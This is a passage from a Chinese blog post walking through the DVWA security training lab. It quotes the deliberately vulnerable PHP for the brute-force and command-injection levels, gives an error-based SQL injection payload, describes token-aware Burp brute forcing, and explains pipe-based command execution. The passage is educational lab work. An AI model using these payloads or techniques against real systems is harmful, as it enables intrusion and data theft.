<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="重温DVWA, hybcx&#39;s blog">
    <meta name="description" content="0x01 Brute Force
Low

这一部分处理用户输入的username与password(md5加密)
// Check the database
    $query  = &#34;SELECT * FROM `users` WHE">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->

    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BYTY196ENH"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
    
      gtag('config', 'G-BYTY196ENH');
    </script>


    <title>重温DVWA | hybcx&#39;s blog</title>
    <link rel="icon" type="image/png" href="/favicon.png">
    


    <!-- bg-cover style     -->



<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
<link rel="stylesheet" type="text/css" href="/css/matery.css">
<link rel="stylesheet" type="text/css" href="/css/my.css">
<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">




    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
    <link rel="stylesheet" href="/css/post.css">




    
        <link rel="stylesheet" type="text/css" href="/css/reward.css">
    



    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 7.2.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span diyFont">hybcx&#39;s blog</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
  <li>
    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">hybcx&#39;s blog</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/hybchenxing/" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/hybchenxing/" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">重温DVWA</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/web%E6%B8%97%E9%80%8F/">
                                <span class="chip bg-color">web渗透</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/Web%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/" class="post-category">
                                Web渗透靶场
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2024-01-10
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2024-01-14
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    15.3k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    69 分
                </div>
                

                
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1>0x01 Brute Force</h1>
<h2 id="Low">Low</h2>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110161718337.png" alt="image-20240110161718337"></p>
<p>这一部分处理用户输入的username与password(md5加密)</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// Check the database</span>
    <span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM `users` WHERE user = '<span class="token interpolation"><span class="token variable">$user</span></span>' AND password = '<span class="token interpolation"><span class="token variable">$pass</span></span>';"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$query</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span>
        <span class="token punctuation">(</span> <span class="token string single-quoted-string">'&lt;pre&gt;'</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/pre&gt;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>构造查询语句（处理用户输入的用户名和密码）接着与数据库连接，进入数据库进行匹配查询</p>
<p><code>mysqli_query</code>:  这是 MySQLi 扩展提供的函数，用于执行 SQL 查询。第一个参数是连接标识符，通常使用全局变量 <code>$GLOBALS["___mysqli_ston"]</code>，第二个参数包含sql查询的字符串</p>
<p><code>or die...</code>如果前面的语句执行失败，就会执行die后面的代码：后面的代码用于获取并输入MySQL错误信息。</p>
<p>首先判断<code>$GLOBALS["___mysqli_ston"]</code>是否为对象，如果是，这说明是存在连接错误，并用<code>mysqli_error</code>函数获取具体的错误信息；如果不是对象，则用<code>mysqli_connect_error</code>获取错误信息</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token operator">&amp;&amp;</span> <span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// Get users details</span>
        <span class="token variable">$row</span>    <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$avatar</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"avatar"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token comment">// Login successful</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p&gt;Welcome to the password protected area <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$user</span><span class="token punctuation">}</span></span>&lt;/p&gt;"</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;img src=\"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$avatar</span><span class="token punctuation">}</span></span>\" /&gt;"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token comment">// Login failed</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>mysqli_num_rows</code>用于获取结果中的行数</p>
<p>如果查询到了返回结果，并且返回的结果行数为1，这说明成功找到对应的用户数据</p>
<p><code>mysql_fetch_assoc </code>从结果中取得一行作为关联数组，并获取该关联数组键值为avatar对应的value，随后就是一些信息的展示</p>
<p><img src="C:/Users/%E4%BB%98%E6%80%9D%E9%92%A7/AppData/Roaming/Typora/typora-user-images/image-20240110163523391.png" alt="image-20240110163523391"></p>
<p>调用mysqli_close关闭MySQL连接，并将关闭结果的布尔值赋值为对应的变量，如果成功关闭，返回false；否则返回变量本身的value</p>
<p>综上分析，该网站对于用户的登录次数并没有做出任何限制，可以尽情的爆破</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110165344749.png" alt="image-20240110165344749"></p>
<p>值得注意的是，这里的代码也没有对用户输入的数据进行过滤，这表明我们可以通过sql注入进去。但这里不能使用联合注入，因为并不会回回显相关查询信息。</p>
<p>但幸运的是我们可以进行万能密码和报错注入（因为mysql_error的存在）</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110174835187.png" alt="image-20240110174835187"></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">username<span class="token operator">=</span>admin'<span class="token operator">+</span><span class="token keyword">and</span><span class="token operator">+</span><span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span>select <span class="token function">version</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">&amp;</span>password<span class="token operator">=</span>bug<span class="token operator">&amp;</span>Login<span class="token operator">=</span>Login<span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110175628824.png" alt="image-20240110175628824"></p>
<p>当然盲注也是可以的，但手工效率低</p>
<h2 id="Medium">Medium</h2>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110165457173.png" alt="image-20240110165457173"></p>
<p>中级水平如上所示。在开始的地方，分别对用户输入的username与password数据由<code>mysqli_real_escape_string</code>进行处理，对用户输入的特殊字符进行转义，特殊字符如下</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110173234354.png" alt="image-20240110173234354"></p>
<p>剩下的基本一致，亮点在于，这里如果用户输入的数据与数据库数据不匹配，则会sleep 2，休眠2秒。但这对我们的爆力破解是无用的，只不过延长了我们爆破的时间</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110173332294.png" alt="image-20240110173332294"></p>
<h2 id="High">High</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">checkToken</span><span class="token punctuation">(</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'user_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'session_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'index.php'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>首先调用了个自定义函数checkToken，并向其中传入用户的令牌以及session会话</p>
<p>并且在对用户的用户名和密码输入方面添加了<code>$user = stripslashes( $user );</code>进行处理，<code>stripslashes</code>在于删除用户输入的数据中可能含有的反引号```</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110174218276.png" alt="image-20240110174218276"></p>
<p>这里依旧同之前的难度基本一致，不过睡眠时间成了随机了</p>
<p><img src="C:/Users/%E4%BB%98%E6%80%9D%E9%92%A7/AppData/Roaming/Typora/typora-user-images/image-20240110174313319.png" alt="image-20240110174313319"></p>
<p>最后这里说该函数是用来生成CSRF令牌的。综上所述，这里防止了CSRF的攻击，但我们仍可以进行暴力破解，不过麻烦的事需要在每次破解的时候，抓取页面的令牌token</p>
<p>这里我们关注一下token的处理，Token 的值来源于 index.php，访问 index.php 查看源码信息，找到如下 token 的位置：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">require_once</span> <span class="token constant">DVWA_WEB_PAGE_TO_ROOT</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'dvwa/includes/dvwaPage.inc.php'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>我们追踪位置，发现如下代码：</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110180228502.png" alt="image-20240110180228502"></p>
<p>这里的checktoken用于检查用户令牌。如果用户令牌与session会话不相等，则报错，并且还会重定向到index.php；而后续的generate函数用当前的时间戳md5值来生成session，这里复习一波如何用burpsuite来爆破</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110180711050.png" alt="image-20240110180711050"></p>
<p>抓包看到这里多了两个参数，但只需要关注token即可。值得注意的是这里含有302重定向，因此我们在bp设置的时候需要跟随以便获取index.php页面的某些数据</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110191340667.png" alt="image-20240110191340667"></p>
<p>这里看到文章说线程最好设置为1，多线程基本不行</p>
<p><img src="C:/Users/%E4%BB%98%E6%80%9D%E9%92%A7/AppData/Roaming/Typora/typora-user-images/image-20240110191514438.png" alt="image-20240110191514438"></p>
<p>这里我们设置爆破点为password与token，其中payload 1 为正常的密码字典即可。payload2设置为递归提取</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110191609562.png" alt="image-20240110191609562"></p>
<p>递归<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=grep&amp;spm=1001.2101.3001.7020">grep</a> （Recursive grep） 主要用于从服务器端提取有效数据，需先从服务器响应中提取数据在替换payload位置进行正则配置</p>
<p>注意：使用递归搜索时线程必须是1</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110191854218.png" alt="image-20240110191854218"></p>
<p>根据上述图片的步骤设置好，对于token的查找，我们在图片右侧选择获取响应，接着在下面的响应中找到token所在位置，鼠标选中即可，接着你会看到上方已经自动生成好了正则表达式</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110192046461.png" alt="image-20240110192046461"></p>
<p>如上图成功爆破</p>
<h2 id="Impossible">Impossible</h2>
<p>前面的某些部分与High一般，我们重点看新增的</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110192548395.png" alt="image-20240110192548395"></p>
<p><code>$data = $db-&gt;prepare( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' );</code>: 创建一个 PDO 准备语句（prepared statement），该语句用于执行 SQL 查询。查询的目标是从名为 “users” 的表中选择 “failed_login” 和 “last_login” 列的值，条件是 “user” 列等于提供的参数 <code>:user</code>。<code>LIMIT 1</code> 确保只返回一行数据。</p>
<p><code>$data-&gt;bindParam( ':user', $user, PDO::PARAM_STR );</code>: 绑定参数 <code>:user</code>，这是一个占位符，与预备语句中的 <code>(:user)</code> 对应。将 <code>$user</code> 变量绑定到这个参数，并指定参数类型为字符串（<code>PDO::PARAM_STR</code>）。</p>
<p>之后便是执行该PDO语句，并获取返回结果中的每一行数据</p>
<p>之后如果返回结果中如果只有一行数据且登陆失败的值大于指定的登录失败的值（3）就进入if循环，根据注释，这代表着用户已经被锁定</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token comment">// 用户被锁定。注意，使用此方法可能导致用户枚举！</span>
<span class="token comment">// echo "&lt;pre&gt;&lt;br /&gt;由于登录错误次数过多，此帐户已被锁定。&lt;/pre&gt;";</span>
<span class="token comment">// 计算用户何时可以再次登录</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>这里获取最后一次登录的时间，接着+15*60，也就是禁用15分钟，接着timenow获取当前时间，如果当前时间小于规定的禁用时间，则账户依旧处于被锁定的状态</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110193530543.png" alt="image-20240110193530543"></p>
<p>这里同上述一般，也是进入数据库查询用户输入的内容是否与其匹配</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110193703159.png" alt="image-20240110193703159"></p>
<p>这里说如果用户的内容在数据库中可以找到，并且用户未处于锁定状态，说明用户成功登录。进入if后，获取了到目前为止登陆失败的次数与上一次登录的时间。</p>
<p>然后判断登录次数是否大于网站限制的登录次数，如果超过了，则会提醒用户在此次登录之前，你的账号存在被暴力破解的危险。</p>
<p>然后重置登陆失败的次数为0（因为成功登陆了）</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110193957147.png" alt="image-20240110193957147"></p>
<p>这里是else语句，如果用户未能成功登录，则会将当前用户对应的登陆失败的次数+1。其实这里的代码逻辑应该是先看下部分在看上部分。</p>
<p>那由于这里对爆破次数做了限制：3次。这几乎断绝了我们破解成功的几率。</p>
<h1>0x02 Command Injection</h1>
<h2 id="Low-2">Low</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Submit'</span> <span class="token punctuation">]</span>  <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// Get input</span>
    <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'ip'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token comment">// Determine OS and execute the ping command.</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">stristr</span><span class="token punctuation">(</span> <span class="token function">php_uname</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'s'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'Windows NT'</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// Windows</span>
        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'ping  '</span> <span class="token operator">.</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token comment">// *nix</span>
        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'ping  -c 4 '</span> <span class="token operator">.</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// Feedback for the end user</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$cmd</span><span class="token punctuation">}</span></span>&lt;/pre&gt;"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>php_uname</code>：这里配合参数s，最终会返回运行次PHP环境的操作系统信息，看是否为Windows系统，根据系统的类别使用适配的ping用法。</p>
<p>这里显而易见没有对用户输入的ip参数做出有效的过滤，这意味着我们可以配合管道符进行命令执行。</p>
<p>由于这里我是Windows下的，我们先简单了解一下Windows下的管道符相关用法：</p>
<blockquote>
<ul>
<li>“|”前面需要正确，然后显示后面语句的执行结果</li>
<li>“||”如果前面执行的语句执行出错，则执行后面的语句，前面的语句只能为假</li>
<li>“&amp;”如果前面的语句为假则直接执行后面的语句，前面的语句为真则依次执行</li>
<li>“&amp;&amp;”如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句只能为真</li>
</ul>
</blockquote>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111200110274.png" alt="image-20240111200110274"></p>
<p>这里我们可以配合|管道符进行命令执行，如上图所示，我们dir成功看到当前目录信息</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111200208094.png" alt="image-20240111200208094"></p>
<p>当然也可以进行文件读取</p>
<h2 id="Medium-2">Medium</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Submit'</span> <span class="token punctuation">]</span>  <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// Get input</span>
    <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'ip'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token comment">// Set blacklist</span>
    <span class="token variable">$substitutions</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
        <span class="token string single-quoted-string">'&amp;&amp;'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">';'</span>  <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Remove any of the characters in the array (blacklist).</span>
